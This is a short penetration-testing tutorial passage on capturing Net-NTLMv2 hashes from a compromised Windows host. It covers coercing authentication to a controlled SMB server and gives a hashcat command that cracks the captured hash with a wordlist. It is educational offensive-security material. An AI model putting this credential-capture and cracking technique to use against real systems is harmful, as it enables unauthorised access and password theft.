In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user. This means that we cannot use tools like Mimikatz to extract passwords or NTLM hashes. In situations like these, we can abuse the _Net-NTLMv2_ network authentication protocol.

To do this, we need our target to start an authentication process using Net-NTLMv2 against a system we control.

If we've obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server.

The hash mode is 5600:

hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force
